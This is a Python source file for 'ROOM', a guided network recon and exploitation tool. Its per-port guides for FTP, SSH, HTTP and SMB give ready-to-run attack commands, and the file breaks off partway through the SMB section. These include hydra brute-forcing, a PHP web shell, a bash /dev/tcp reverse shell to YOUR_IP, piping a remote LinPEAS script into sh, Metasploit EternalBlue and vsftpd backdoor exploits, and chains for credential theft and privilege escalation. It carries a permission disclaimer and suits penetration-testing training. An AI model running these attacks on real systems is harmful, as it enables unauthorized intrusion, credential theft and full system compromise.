#!/usr/bin/env python3
"""
ROOM - Recon. Observe. Operate. Map.
Guided network recon + interactive exploitation guide.
100% free, no API, works offline.
Only use on systems you own or have explicit permission to test.
"""

import subprocess
import sys
import socket
import argparse
import re
import os
import shutil
import platform
from datetime import datetime

IS_WINDOWS = platform.system() == "Windows"
IS_LINUX   = platform.system() == "Linux"
IS_MAC     = platform.system() == "Darwin"

R   = "\033[1;31m"
G   = "\033[1;32m"
Y   = "\033[1;33m"
B   = "\033[1;34m"
C   = "\033[1;36m"
M   = "\033[1;35m"
W   = "\033[1;37m"
DIM = "\033[2m"
RST = "\033[0m"

SEV = {4: (R,"CRITICAL"), 3: (Y,"HIGH"), 2: (C,"MEDIUM"), 1: (G,"LOW"), 0: (DIM,"INFO")}

BANNER = f"""{C}
  ██████╗  ██████╗  ██████╗ ███╗   ███╗
  ██╔══██╗██╔═══██╗██╔═══██╗████╗ ████║
  ██████╔╝██║   ██║██║   ██║██╔████╔██║
  ██╔══██╗██║   ██║██║   ██║██║╚██╔╝██║
  ██║  ██║╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
{RST}{W}  Recon. Observe. Operate. Map.{RST}
{DIM}  Guided Network Recon + Exploit Guide v3.0{RST}
{M}  Inspired by Trafalgar D. Water Law — Surgeon of Death{RST}
{B}  ─────────────────────────────────────────────────────{RST}
"""

LAW_QUOTES = [
    "\"I've already decided... I will never bow to anyone again.\"  — Law",
    "\"In the New World, nothing ever goes as planned.\"  — Law",
    "\"Room.\"  — Law  (activating his Devil Fruit ability)",
    "\"I can handle my own battles. Stop interfering.\"  — Law",
    "\"Survive. That's all that matters.\"  — Law",
]

HELP_SCREEN = f"""
{BANNER}
{W}USAGE:{RST}
  python3 room.py <target> [options]
  python3 room.py --install
  python3 room.py --exploit <port> --target <ip>
  python3 room.py --help

{W}OPTIONS:{RST}
  {C}--mode {Y}<quick|full|all>{RST}        Scan depth  {DIM}(default: quick){RST}
  {C}--exploit {Y}<port>{RST}               Jump straight to exploit guide for a port
  {C}--target {Y}<ip>{RST}                  Target for --exploit mode
  {C}--install{RST}                     Check & install all tools
  {C}--help{RST}                        Show this screen

{W}SCAN MODES:{RST}
  {G}quick{RST}   Top 1000 ports + service detection + guided analysis    {DIM}~1 min{RST}
  {Y}full{RST}    All 65535 ports + guided analysis + HTTP headers         {DIM}~6 min{RST}
  {R}all{RST}     Full + OS detection + NSE vuln scripts + full report     {DIM}~12 min{RST}

{W}EXAMPLES:{RST}
  {C}python3 room.py scanme.nmap.org{RST}
  {C}python3 room.py 192.168.1.1 --mode full{RST}
  {C}python3 room.py 10.0.0.5 --mode all{RST}
  {C}python3 room.py --exploit 21 --target 10.0.0.5{RST}

{W}AFTER SCAN:{RST}
  ROOM shows an {Y}interactive menu{RST} — pick any open port
  and get a full step-by-step exploitation guide with
  vulnerability chaining (how one vuln leads to the next).

{M}  \"Room.\" — Trafalgar D. Water Law{RST}

{B}  ─────────────────────────────────────────────────────{RST}
{DIM}  Legal: Only scan systems you own or have written permission to test.{RST}
"""

# ─────────────────────────────────────────────────────────────────────────────
#  KNOWLEDGE BASE — recon info per port
# ─────────────────────────────────────────────────────────────────────────────
KB = {
    21: {
        "name": "FTP", "severity": 3,
        "what": "File Transfer Protocol — transfers files between client and server.",
        "why": "Often allows anonymous login. Credentials and data sent in plaintext. Outdated versions have known RCE vulnerabilities.",
        "cves": ["CVE-2011-2523 (vsftpd backdoor)", "CVE-2010-4221 (ProFTPD RCE)"],
        "commands": [
            "nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor {t}",
            "ftp {t}   # try: anonymous / anonymous@",
            "nc {t} 21   # grab banner manually",
            "nmap -p21 --script ftp-brute --script-args userdb=users.txt,passdb=pass.txt {t}",
        ],
        "look_for": [
            "Anonymous login allowed — means anyone can read/write files",
            "Banner reveals software version — search it for CVEs",
            "Writable directories — can be used to plant files",
            "vsftpd 2.3.4 — has a known backdoor triggered on port 6200",
        ],
    },
    22: {
        "name": "SSH", "severity": 2,
        "what": "Secure Shell — encrypted remote terminal access.",
        "why": "Weak passwords or old OpenSSH versions can be brute-forced or exploited.",
        "cves": ["CVE-2023-38408 (OpenSSH agent RCE)", "CVE-2016-6515 (DoS)"],
        "commands": [
            "nmap -p22 --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey {t}",
            "ssh -v {t}   # check version and supported auth",
            "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{t}",
            "nmap -p22 --script ssh-brute --script-args userdb=users.txt {t}",
        ],
        "look_for": [
            "Password authentication enabled — brute-force risk",
            "OpenSSH version < 8.0 — check for known CVEs",
            "Weak ciphers: arcfour, 3des-cbc, blowfish-cbc",
            "Root login permitted — critical misconfiguration",
        ],
    },
    23: {
        "name": "Telnet", "severity": 4,
        "what": "Unencrypted remote terminal. Obsolete and dangerous.",
        "why": "Everything transmitted in cleartext. Any attacker on the network can intercept everything.",
        "cves": ["Protocol itself is the vulnerability"],
        "commands": [
            "nc {t} 23   # connect and grab banner",
            "nmap -p23 --script telnet-ntlm-info,telnet-encryption {t}",
            "hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://{t}",
        ],
        "look_for": [
            "ANY open Telnet — flag CRITICAL immediately",
            "Login banner reveals OS, hostname, software version",
            "Default credentials: admin/admin, root/root",
        ],
    },
    25: {
        "name": "SMTP", "severity": 2,
        "what": "Simple Mail Transfer Protocol — sends email between servers.",
        "why": "Open relays allow spam. User enumeration via VRFY/EXPN. Older versions have RCE.",
        "cves": ["CVE-2020-7247 (OpenSMTPD RCE)", "CVE-2019-10149 (Exim RCE)"],
        "commands": [
            "nmap -p25 --script smtp-open-relay,smtp-enum-users,smtp-commands {t}",
            "nc {t} 25   # try EHLO, VRFY root, EXPN admin",
            "smtp-user-enum -M VRFY -U users.txt -t {t}",
        ],
        "look_for": [
            "Open relay — external addresses accepted",
            "VRFY enabled — confirms valid usernames",
            "Banner reveals Exim/Postfix version",
        ],
    },
    53: {
        "name": "DNS", "severity": 2,
        "what": "Domain Name System — resolves hostnames to IPs.",
        "why": "Zone transfers expose the entire internal network map.",
        "cves": ["CVE-2020-1350 (SIGRed Windows DNS RCE)"],
        "commands": [
            "dig axfr @{t} <domain>",
            "nmap -p53 --script dns-zone-transfer,dns-recursion {t}",
            "dnsrecon -d <domain> -n {t} -t axfr",
        ],
        "look_for": [
            "Zone transfer succeeds — all internal hostnames exposed",
            "Recursive queries allowed — DDoS amplification risk",
            "Internal names: dev., staging., vpn., admin.",
        ],
    },
    80: {
        "name": "HTTP", "severity": 2,
        "what": "Unencrypted web server.",
        "why": "Full web attack surface: SQLi, XSS, RFI, directory traversal, default creds.",
        "cves": ["CVE-2021-41773 (Apache path traversal)", "CVE-2017-5638 (Struts RCE)"],
        "commands": [
            "nikto -h http://{t}",
            "gobuster dir -u http://{t} -w /usr/share/wordlists/dirb/common.txt",
            "curl -I http://{t}",
            "nmap -p80 --script http-enum,http-headers,http-methods,http-title {t}",
            "whatweb http://{t}",
        ],
        "look_for": [
            "Server header reveals software + version",
            "Missing security headers: X-Frame-Options, CSP, HSTS",
            "Admin panels: /admin /manager /phpmyadmin /wp-admin",
            "Directory listing enabled",
        ],
    },
    443: {
        "name": "HTTPS", "severity": 1,
        "what": "Encrypted web server over TLS/SSL.",
        "why": "Weak TLS configs, expired certs, Heartbleed are common.",
        "cves": ["CVE-2014-0160 (Heartbleed)", "CVE-2014-3566 (POODLE)"],
        "commands": [
            "nikto -h https://{t} -ssl",
            "nmap -p443 --script ssl-enum-ciphers,ssl-heartbleed,ssl-cert {t}",
            "openssl s_client -connect {t}:443",
            "testssl.sh {t}",
        ],
        "look_for": [
            "TLS 1.0/1.1 supported — outdated",
            "Self-signed or expired certificate",
            "Heartbleed vulnerable",
            "Missing HSTS header",
        ],
    },
    445: {
        "name": "SMB", "severity": 4,
        "what": "Windows file sharing and remote administration.",
        "why": "EternalBlue (WannaCry) exploits this. Null sessions, pass-the-hash, ransomware.",
        "cves": ["CVE-2017-0144 (EternalBlue)", "CVE-2020-0796 (SMBGhost)"],
        "commands": [
            "nmap -p445 --script smb-vuln-ms17-010,smb-vuln-cve-2020-0796 {t}",
            "nmap -p445 --script smb-enum-shares,smb-enum-users,smb-security-mode {t}",
            "smbclient -L //{t} -N",
            "enum4linux -a {t}",
            "crackmapexec smb {t}",
        ],
        "look_for": [
            "EternalBlue (MS17-010) — critical RCE",
            "SMBv1 enabled — insecure",
            "Null session — anonymous share access",
            "Readable shares: C$, ADMIN$",
        ],
    },
    1433: {
        "name": "MSSQL", "severity": 4,
        "what": "Microsoft SQL Server.",
        "why": "Internet-exposed MSSQL is critical. xp_cmdshell = OS command execution.",
        "cves": ["CVE-2020-0618 (SSRS RCE)"],
        "commands": [
            "nmap -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config {t}",
            "hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://{t}",
            "impacket-mssqlclient sa@{t}",
        ],
        "look_for": [
            "sa account empty/default password — instant RCE",
            "xp_cmdshell enabled",
            "Database names for sensitive data",
        ],
    },
    3306: {
        "name": "MySQL", "severity": 4,
        "what": "MySQL database server.",
        "why": "Remote root login, empty passwords, and data dumping are common findings.",
        "cves": ["CVE-2012-2122 (auth bypass)", "CVE-2016-6662 (RCE)"],
        "commands": [
            "nmap -p3306 --script mysql-info,mysql-empty-password,mysql-enum {t}",
            "mysql -h {t} -u root   # try root with no password",
            "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{t}",
        ],
        "look_for": [
            "Root with empty password — full DB access",
            "Remote root login allowed",
            "Sensitive databases: wordpress, users, customers",
        ],
    },
    3389: {
        "name": "RDP", "severity": 3,
        "what": "Remote Desktop Protocol — graphical Windows remote access.",
        "why": "BlueKeep allows unauthenticated RCE. Brute-force is very common.",
        "cves": ["CVE-2019-0708 (BlueKeep)", "CVE-2019-1182 (DejaBlue)"],
        "commands": [
            "nmap -p3389 --script rdp-vuln-ms12-020,rdp-enum-encryption {t}",
            "nmap -p3389 --script rdp-vuln-cve-2019-0708 {t}",
            "hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://{t}",
        ],
        "look_for": [
            "BlueKeep on Win7/2008 — unauthenticated RCE",
            "NLA disabled — auth after connection",
            "Weak admin credentials",
        ],
    },
    5900: {
        "name": "VNC", "severity": 4,
        "what": "Virtual Network Computing — graphical remote desktop.",
        "why": "Often no password or weak password. No encryption by default.",
        "cves": ["CVE-2006-2369 (auth bypass)"],
        "commands": [
            "nmap -p5900 --script vnc-info,vnc-brute,realvnc-auth-bypass {t}",
            "vncviewer {t}   # try with no password",
            "hydra -P /usr/share/wordlists/rockyou.txt vnc://{t}",
        ],
        "look_for": [
            "No authentication required",
            "RealVNC auth bypass",
            "Weak 4-8 character password",
        ],
    },
    6379: {
        "name": "Redis", "severity": 4,
        "what": "Redis in-memory data store / cache.",
        "why": "No authentication by default. Data theft, config write, and RCE via cron/SSH key injection.",
        "cves": ["CVE-2022-0543 (Lua RCE)", "CVE-2015-8080"],
        "commands": [
            "redis-cli -h {t} ping   # PONG = no auth, wide open",
            "redis-cli -h {t} info",
            "redis-cli -h {t} keys '*'",
            "redis-cli -h {t} config get dir",
        ],
        "look_for": [
            "PONG to ping — unauthenticated confirmed",
            "config get dir — path for file write",
            "SSH key injection or cron reverse shell possible",
            "Sensitive keys: session:, user:, token:",
        ],
    },
    8080: {
        "name": "HTTP-Alt", "severity": 2,
        "what": "Alternative HTTP — often dev server, proxy, or admin panel.",
        "why": "Dev servers have debug mode, weaker auth, or expose internal APIs.",
        "cves": ["CVE-2020-1938 (Tomcat AJP Ghostcat)"],
        "commands": [
            "curl -I http://{t}:8080",
            "nikto -h http://{t}:8080",
            "gobuster dir -u http://{t}:8080 -w /usr/share/wordlists/dirb/common.txt",
            "nmap -p8080 --script http-title,http-headers,http-enum {t}",
        ],
        "look_for": [
            "Tomcat manager /manager/html — default: tomcat/tomcat",
            "Jenkins — unauthenticated script console",
            "Spring Boot Actuator /actuator/env",
        ],
    },
    27017: {
        "name": "MongoDB", "severity": 4,
        "what": "MongoDB NoSQL database.",
        "why": "No authentication by default. Databases wiped and ransomed regularly.",
        "cves": ["Countless breaches from default no-auth config"],
        "commands": [
            "mongo {t}:27017   # no credentials needed",
            "nmap -p27017 --script mongodb-info,mongodb-databases {t}",
            "mongodump --host {t}",
        ],
        "look_for": [
            "Connection without credentials — critical",
            "show dbs — list all databases",
            "Sensitive: users, accounts, sessions, orders",
        ],
    },
    9200: {
        "name": "Elasticsearch", "severity": 4,
        "what": "Elasticsearch search and analytics engine.",
        "why": "No auth by default. Direct HTTP API exposes all indexed data.",
        "cves": ["CVE-2015-1427 (Groovy sandbox RCE)"],
        "commands": [
            "curl http://{t}:9200/",
            "curl http://{t}:9200/_cat/indices",
            "curl http://{t}:9200/_cluster/health",
        ],
        "look_for": [
            "Accessible without auth",
            "_cat/indices — users, logs, sessions, orders",
            "Older versions — RCE via dynamic scripting",
        ],
    },
}

# ─────────────────────────────────────────────────────────────────────────────
#  EXPLOITATION GUIDE — deep step-by-step per port
# ─────────────────────────────────────────────────────────────────────────────
EXPLOIT_GUIDE = {
    21: {
        "title": "FTP — Full Exploitation Guide",
        "intro": "FTP is one of the most beginner-friendly services to test. Start with anonymous access, then move to version exploits and brute-force.",
        "phases": [
            {
                "name": "PHASE 1 — Reconnaissance",
                "desc": "First, gather information about the FTP service before touching it.",
                "steps": [
                    ("Banner grab", "nc {t} 21",
                     "Connect raw and read the first line. It tells you the FTP server software and version. Note it down — you will search for CVEs based on this."),
                    ("Nmap deep scan", "nmap -p21 --script ftp-anon,ftp-syst,ftp-bounce,ftp-vsftpd-backdoor -sV {t}",
                     "This runs 4 scripts at once: checks anonymous login, gets OS info, checks for FTP bounce attack, and checks vsftpd 2.3.4 backdoor."),
                ],
                "what_to_note": "Software name + version, whether anonymous login is mentioned, any error messages.",
            },
            {
                "name": "PHASE 2 — Anonymous Login Attempt",
                "desc": "Many FTP servers allow login without a password using 'anonymous' as the username.",
                "steps": [
                    ("Try anonymous login", "ftp {t}",
                     "When prompted for username type: anonymous\nWhen prompted for password type: anonymous@domain.com (or just press Enter)\nIf it says '230 Login successful' — you're in without any credentials."),
                    ("List files", "ls -la",
                     "Inside FTP, list all files including hidden ones. Look for config files, backups, .htpasswd, web files, SSH keys, or anything sensitive."),
                    ("Download everything", "wget -m ftp://anonymous:anonymous@{t}",
                     "This downloads the entire FTP directory tree to your machine for offline analysis. Much faster than browsing manually."),
                ],
                "what_to_note": "Any config files, credentials in files, SSH keys, database files, backup archives.",
            },
            {
                "name": "PHASE 3 — Version Exploit Check",
                "desc": "If the version is known, check for public exploits.",
                "steps": [
                    ("Check vsftpd 2.3.4 backdoor", "nmap -p21 --script ftp-vsftpd-backdoor {t}",
                     "vsftpd 2.3.4 has a famous backdoor — when you send a username with a smiley ':)' it opens a shell on port 6200. If vulnerable, connect with: nc {t} 6200"),
                    ("Search exploits", "searchsploit vsftpd 2.3.4",
                     "searchsploit searches your local Exploit-DB copy. Replace 'vsftpd 2.3.4' with whatever version you found. Use: searchsploit <software> <version>"),
                    ("Metasploit check", "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {t}; run'",
                     "Metasploit automates the vsftpd backdoor. If the banner showed vsftpd 2.3.4, this may give you a shell instantly."),
                ],
                "what_to_note": "Whether exploit worked, what shell access level you got (user or root).",
            },
            {
                "name": "PHASE 4 — Brute Force",
                "desc": "If anonymous fails and no version exploit exists, try brute-forcing credentials.",
                "steps": [
                    ("Brute force with hydra", "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{t}",
                     "Tries common passwords for 'admin'. Replace -l with -L users.txt to try multiple usernames. rockyou.txt has 14 million passwords."),
                    ("Try common credentials manually", "ftp {t}",
                     "Try these manually first before running hydra:\nadmin / admin\nadmin / password\nroot / root\nftpuser / ftpuser\nuser / 1234"),
                    ("Nmap brute script", "nmap -p21 --script ftp-brute --script-args userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt {t}",
                     "Uses nmap's built-in brute force script with a short username list. Faster than hydra for quick checks."),
                ],
                "what_to_note": "Any valid username/password combinations found.",
            },
            {
                "name": "PHASE 5 — Post Access",
                "desc": "Once logged in — what to do next.",
                "steps": [
                    ("Check write access", "echo test > test.txt\nput test.txt",
                     "If you can upload files, you may be able to plant a web shell if the FTP directory is served by a web server. Check if /var/www/html is the FTP root."),
                    ("Look for credentials", "get config.php\nget wp-config.php\nget .htpasswd",
                     "Web config files often contain database passwords. Download and read them — these credentials often work on other services (password reuse)."),
                    ("Check for web shell opportunity", "curl http://{t}/test.txt",
                     "If you uploaded test.txt and it's accessible via HTTP, you can upload a PHP web shell: <?php system($_GET['cmd']); ?> saved as shell.php"),
                ],
                "what_to_note": "Write access status, any credentials found, web shell upload success.",
            },
        ],
        "chain": [
            ("FTP anonymous login", "→", "Read web config files (wp-config.php, config.php)", "→", "Find database password", "→", "Login to MySQL/phpMyAdmin"),
            ("FTP write access", "→", "Upload PHP web shell to /var/www/html", "→", "RCE via browser", "→", "Reverse shell", "→", "Privilege escalation"),
            ("FTP credentials found", "→", "Password reuse on SSH (port 22)", "→", "Full shell access"),
            ("vsftpd 2.3.4 backdoor", "→", "Root shell on port 6200", "→", "Full system compromise"),
        ],
    },
    22: {
        "title": "SSH — Full Exploitation Guide",
        "intro": "SSH is usually a secondary target — you get credentials from elsewhere and use them here. But weak configs and old versions are worth checking.",
        "phases": [
            {
                "name": "PHASE 1 — Fingerprinting",
                "desc": "Gather as much info as possible before attempting anything.",
                "steps": [
                    ("Version and algo check", "nmap -p22 --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey -sV {t}",
                     "This tells you: exact OpenSSH version, which authentication methods are allowed (password vs key), supported ciphers and MACs. Weak ciphers = older/vulnerable version."),
                    ("Banner grab", "ssh -v {t} 2>&1 | head -20",
                     "Verbose SSH connection shows the exact protocol version, server software, and supported key exchange algorithms. Press Ctrl+C after you see the info — don't need to log in."),
                    ("Check for username enumeration", "nmap -p22 --script ssh-auth-methods --script-args ssh.user=root {t}",
                     "Some old SSH versions tell you whether a username exists or not. If 'root' shows 'password' as allowed, root login is enabled."),
                ],
                "what_to_note": "OpenSSH version, whether password auth is enabled, whether root login is allowed.",
            },
            {
                "name": "PHASE 2 — Default & Common Credentials",
                "desc": "Try the obvious before running a full brute force.",
                "steps": [
                    ("Manual common creds", "ssh root@{t}\nssh admin@{t}\nssh ubuntu@{t}\nssh pi@{t}",
                     "Try these passwords: root, toor, admin, password, 1234, raspberry (for Pi)\nIoT and cloud default users often have weak passwords set at deployment."),
                    ("Try credentials from other services", "ssh <user_from_ftp>@{t}",
                     "If you found credentials on FTP, SMB, a web app, or a database — try them here. Password reuse is the most common real-world finding."),
                ],
                "what_to_note": "Any successful logins, what user level you get (regular user vs root).",
            },
            {
                "name": "PHASE 3 — Brute Force",
                "desc": "If manual attempts fail, use automated brute force. Be careful — many systems lock accounts after failed attempts.",
                "steps": [
                    ("Hydra brute force", "hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://{t}",
                     "-t 4 means 4 threads — keeps it slow enough to avoid lockouts. Remove -l root and use -L users.txt to try multiple usernames. This can take hours on large wordlists."),
                    ("Medusa (faster alternative)", "medusa -h {t} -u root -P /usr/share/wordlists/rockyou.txt -M ssh",
                     "Medusa is often faster than Hydra for SSH. Same principle — adjust username and wordlist."),
                    ("Nmap brute (quick check)", "nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt {t}",
                     "Good for a quick check with a small list. Slower than Hydra for large wordlists."),
                ],
                "what_to_note": "Valid credential pairs found.",
            },
            {
                "name": "PHASE 4 — Version Exploits",
                "desc": "Check if the specific OpenSSH version has known vulnerabilities.",
                "steps": [
                    ("Search exploits", "searchsploit openssh 6.6",
                     "Replace 6.6 with the version you found. Look for RCE or auth bypass vulnerabilities specifically."),
                    ("CVE-2023-38408 check", "ssh-keyscan -t rsa {t}",
                     "OpenSSH < 9.3p2 with ssh-agent forwarding enabled is vulnerable to remote code execution via malicious PKCS#11 libraries. Check if forwarding is enabled."),
                ],
                "what_to_note": "Any applicable CVEs for the version found.",
            },
            {
                "name": "PHASE 5 — Post Login",
                "desc": "Once you have SSH access — enumerate and escalate.",
                "steps": [
                    ("Basic enumeration", "id\nwhoami\nuname -a\ncat /etc/passwd\nls /home",
                     "Find out who you are, what OS and kernel version is running, what other users exist. Kernel version is crucial for privilege escalation."),
                    ("Check sudo rights", "sudo -l",
                     "Lists what commands you can run as root without a password. Even a single command like 'sudo vim' can lead to full root via GTFOBins."),
                    ("LinPEAS privilege escalation", "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
                     "LinPEAS automatically scans for every common privilege escalation vector: SUID binaries, cron jobs, writable files, kernel exploits, weak configs. Run it and read the output carefully."),
                    ("Check for SSH keys", "cat ~/.ssh/authorized_keys\nls ~/.ssh/",
                     "Other users' SSH keys stored here may let you pivot to other machines. Also check /root/.ssh/ if you have access."),
                ],
                "what_to_note": "Your user level, sudo rights, kernel version for privesc, other users on the system.",
            },
        ],
        "chain": [
            ("SSH weak password", "→", "User shell access", "→", "sudo -l check", "→", "Root via GTFOBins"),
            ("SSH user access", "→", "LinPEAS scan", "→", "SUID binary / cron job", "→", "Root shell"),
            ("SSH key found elsewhere (FTP/web)", "→", "Passwordless SSH login", "→", "Full access"),
            ("SSH access", "→", "Read /etc/passwd + /etc/shadow", "→", "Crack hashes offline", "→", "More accounts"),
        ],
    },
    80: {
        "title": "HTTP Web Server — Full Exploitation Guide",
        "intro": "Web servers are the largest attack surface. Start broad with automated tools, then go deep on what you find. Every finding can chain into the next.",
        "phases": [
            {
                "name": "PHASE 1 — Fingerprinting",
                "desc": "Find out exactly what is running before trying anything.",
                "steps": [
                    ("Technology fingerprint", "whatweb http://{t}\ncurl -I http://{t}",
                     "whatweb identifies CMS (WordPress, Joomla, Drupal), frameworks (Laravel, Django), server software, and versions. The Server: header in curl output reveals Apache/nginx version."),
                    ("Nmap web scripts", "nmap -p80 --script http-title,http-headers,http-methods,http-server-header,http-auth-finder {t}",
                     "Checks page title, all headers, which HTTP methods are allowed (PUT/DELETE can be dangerous), and whether auth is required anywhere."),
                    ("Check robots.txt and sitemap", "curl http://{t}/robots.txt\ncurl http://{t}/sitemap.xml",
                     "robots.txt often lists directories the owner wants hidden from search engines — exactly what you want to find. Admin panels, private areas, API endpoints."),
                ],
                "what_to_note": "CMS name and version, server software, anything in robots.txt, auth-protected areas.",
            },
            {
                "name": "PHASE 2 — Directory & File Enumeration",
                "desc": "Find hidden pages, admin panels, backup files, and config files.",
                "steps": [
                    ("Gobuster directory scan", "gobuster dir -u http://{t} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak",
                     "Brute-forces directory and file names. -x adds file extensions to check. Look for: /admin, /backup, /config, /upload, /api, /.git, /phpinfo.php"),
                    ("Dirb scan", "dirb http://{t} /usr/share/wordlists/dirb/big.txt",
                     "Alternative to gobuster. Uses a bigger wordlist. Slower but finds more. Good for thorough enumeration."),
                    ("Check common sensitive files", "curl http://{t}/.git/HEAD\ncurl http://{t}/backup.zip\ncurl http://{t}/config.php.bak\ncurl http://{t}/.env",
                     ".env files contain database passwords, API keys, and secrets. .git/HEAD means git repo is exposed — download with: git-dumper http://{t}/.git/ ./repo"),
                ],
                "what_to_note": "Any 200 status pages, admin panels, backup files, config files, .git exposure.",
            },
            {
                "name": "PHASE 3 — Automated Vulnerability Scan",
                "desc": "Run Nikto to automatically find common web vulnerabilities.",
                "steps": [
                    ("Nikto scan", "nikto -h http://{t} -o nikto_results.txt",
                     "Nikto checks for: outdated software, dangerous HTTP methods, default files, misconfigurations, known CVEs, information disclosure. Read every line of output — it tells you exactly what to do next."),
                    ("WordPress scan (if WordPress)", "wpscan --url http://{t} --enumerate u,p,t",
                     "If whatweb or gobuster found WordPress, wpscan finds: vulnerable plugins, vulnerable themes, usernames, and weak passwords. The most powerful CMS scanner available."),
                    ("Joomla scan (if Joomla)", "joomscan --url http://{t}",
                     "Joomla equivalent of wpscan. Finds vulnerable components, config exposure, and version-specific CVEs."),
                ],
                "what_to_note": "All Nikto findings, vulnerable plugins/themes if CMS found, usernames discovered.",
            },
            {
                "name": "PHASE 4 — Manual Testing",
                "desc": "Test for the most impactful vulnerabilities manually.",
                "steps": [
                    ("SQL Injection test", "sqlmap -u 'http://{t}/page.php?id=1' --dbs",
                     "If you found any URL with parameters (?id=1, ?user=admin), test for SQLi. sqlmap automates it completely. --dbs dumps all database names. Then: sqlmap -u URL -D dbname --tables"),
                    ("File upload test", "curl -F 'file=@shell.php' http://{t}/upload",
                     "If there's an upload form, try uploading a PHP file. If it works and you can access it via browser, you have Remote Code Execution. Create shell.php: <?php system($_GET['cmd']); ?>"),
                    ("LFI test", "curl 'http://{t}/page.php?file=../../../etc/passwd'",
                     "Local File Inclusion lets you read server files. Try: ?page=, ?file=, ?include=, ?path= parameters with ../../../etc/passwd. If you see the passwd file — LFI confirmed."),
                    ("Default credentials on login pages", "admin/admin\nadmin/password\nadmin/1234\nroot/root",
                     "Always try default credentials on any login form you find. Check the software name first — search '[software] default credentials'."),
                ],
                "what_to_note": "SQLi findings, upload success, LFI paths that work, valid credentials.",
            },
            {
                "name": "PHASE 5 — Getting a Shell",
                "desc": "Turn any code execution into a proper reverse shell.",
                "steps": [
                    ("Start listener", "nc -lvnp 4444",
                     "Run this on YOUR machine first — it listens for incoming connections. Replace 4444 with any port you like."),
                    ("PHP reverse shell", "curl 'http://{t}/shell.php?cmd=bash+-c+\"bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261\"'",
                     "If you have a web shell (shell.php), trigger a reverse shell back to your machine. Replace YOUR_IP with your actual IP address."),
                    ("Upgrade shell", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\nCtrl+Z\nstty raw -echo; fg",
                     "Upgrade from a dumb shell to a fully interactive TTY. This gives you tab completion, arrow keys, and proper terminal control."),
                ],
                "what_to_note": "Shell user level, what you can access, kernel version for privesc.",
            },
        ],
        "chain": [
            ("robots.txt reveals /admin", "→", "Default credentials", "→", "Admin panel access", "→", "File upload", "→", "Web shell", "→", "Reverse shell"),
            ("Gobuster finds .git", "→", "git-dumper downloads source code", "→", "Read config files", "→", "Database credentials", "→", "MySQL access"),
            ("Nikto finds SQLi", "→", "sqlmap dumps database", "→", "Extract credentials", "→", "Password reuse on SSH", "→", "Shell access"),
            ("LFI found", "→", "Read /etc/passwd", "→", "Read SSH private key /home/user/.ssh/id_rsa", "→", "SSH login as that user"),
            (".env file exposed", "→", "Database password found", "→", "DB access", "→", "Add admin user", "→", "Login to web app as admin"),
        ],
    },
    445: {
        "title": "SMB — Full Exploitation Guide",
        "intro": "SMB is one of the most dangerous services to expose. EternalBlue alone compromised hundreds of thousands of machines. Always check SMB first on Windows targets.",
        "phases": [
            {
                "name": "PHASE 1 — Enumeration",
                "desc": "Map out exactly what SMB is offering before attacking.",
                "steps": [
                    ("Basic SMB info", "nmap -p445 --script smb-security-mode,smb-protocols,smb2-security-mode -sV {t}",
                     "Tells you: SMB version (v1/v2/v3), signing required, security mode. SMBv1 = huge red flag, signing disabled = relay attacks possible."),
                    ("Enumerate shares", "smbclient -L //{t} -N\nenum4linux -S {t}",
                     "-N means null session (no password). If it works, you see all shared folders. Look for non-default shares beyond IPC$, C$, ADMIN$."),
                    ("Full enum4linux", "enum4linux -a {t}",
                     "The most powerful SMB enumeration tool. -a runs everything: shares, users, groups, password policy, OS info. Run this every time."),
                    ("CrackMapExec fingerprint", "crackmapexec smb {t}",
                     "Instantly shows: hostname, domain, OS version, SMB signing. If signing is False — you can do NTLM relay attacks."),
                ],
                "what_to_note": "SMB version, signing status, all share names, any usernames found, OS version.",
            },
            {
                "name": "PHASE 2 — EternalBlue Check (MS17-010)",
                "desc": "The most critical SMB check. EternalBlue gives SYSTEM shell without any credentials.",
                "steps": [
                    ("Check vulnerability", "nmap -p445 --script smb-vuln-ms17-010 {t}",
                     "If output says 'VULNERABLE' — this target can be compromised immediately without credentials. This is the vulnerability used by WannaCry ransomware."),
                    ("Exploit with Metasploit", "msfconsole -q\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {t}\nset LHOST YOUR_IP\nrun",
                     "If vulnerable, this gives you a SYSTEM shell — the highest privilege on Windows. Replace YOUR_IP with your machine's IP. This often works first try."),
                    ("Manual check", "python3 checker.py {t}",
                     "Download MS17-010 checker from GitHub: git clone https://github.com/worawit/MS17-010. Run checker.py first to confirm vulnerability before exploiting."),
                ],
                "what_to_note": "Whether MS17-010 is confirmed vulnerable.",
            },
            {
                "name": "PHASE 3 — SMBGhost Check (CVE-2020-0796)",
                "desc": "Newer critical SMB vulnerability affecting Windows 10 and Server 2019.",
                "steps": [
                    ("Check SMBGhost", "nmap -p445 --script smb-vuln-cve-2020-0796 {t}",
                     "SMBGhost affects Windows 10 v1903/1909 and Server 2019. Unpatched systems are vulnerable to BSOD and potentially RCE."),
                    ("Searchsploit check", "searchsploit SMBGhost\nsearchsploit CVE-2020-0796",
                     "Search your local Exploit-DB for available exploits and proof-of-concept code."),
                ],
                "what_to_note": "Whether SMBGhost applies to the target OS version.",
            },
            {
                "name": "PHASE 4 — Null Session & Share Access",
                "desc": "Without exploits, try accessing shares anonymously or with default credentials.",
                "steps": [
                    ("Anonymous share browse", "smbclient //{t}/SHARE_NAME -N",
